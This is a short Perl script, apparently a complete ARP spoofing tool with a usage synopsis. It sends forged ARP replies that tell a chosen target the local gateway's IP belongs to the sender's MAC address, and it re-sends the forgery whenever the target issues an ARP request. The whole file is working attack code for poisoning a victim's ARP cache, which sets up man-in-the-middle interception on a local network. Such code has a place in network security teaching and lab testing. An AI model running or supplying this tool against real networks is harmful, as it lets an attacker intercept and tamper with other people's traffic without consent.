#!/usr/bin/perl

=head2 SYNOPSIS
Run with system Perl:
  $ sudo ./arp_spoof <target ip address> <target mac address>
=cut

use strict;
use warnings;
use feature 'say';
use Net::ARP;
use Net::Frame::Device;
use Net::Frame::Dump::Online;
use Net::Frame::Simple;
use Net::Pcap;

die "Usage\nsudo perl Spoof_ARP.pl <target_ip> <target_mac>\n" unless @ARGV == 2;
my ($target_ip, $target_mac) = @ARGV;

my ($filter, $net, $mask) = ("") x 3;

my $network_device_name = pcap_lookupdev(\my $err);
my $device = Net::Frame::Device->new(dev => $network_device_name);

pcap_lookupnet($network_device_name, \$net, \$mask, \$err);

my $filterStr = '(arp)&&(ether dst ' . $device->mac . ")&&(ether src $target_mac)";

my $pcap = Net::Frame::Dump::Online->new(
  dev           => $network_device_name,
  filter        => $filterStr,
  promisc       => 0,
  unlinkOnStop  => 1,
  timeoutOnNext => 1000,
);
$pcap->start;
ARPSend();

sub ARPSend
{
  Net::ARP::send_packet(
    $network_device_name,
    $device->gatewayIp,
    $target_ip,
    $device->mac,
    $target_mac,
    "reply",
  );
  spoofarp();
}

sub spoofarp
{
  until ($pcap->timeout)
  {
    if (my $frame = $pcap->next)
    {
      my $fref = Net::Frame::Simple->newFromDump($frame);
      if($fref->ref->{ARP}->opCode == 1)
      {
        say "[-] got request from target, sending reply";
        ARPSend();
      }
    }
  }
}

END { $pcap->stop if $pcap; say 'Exit.'; }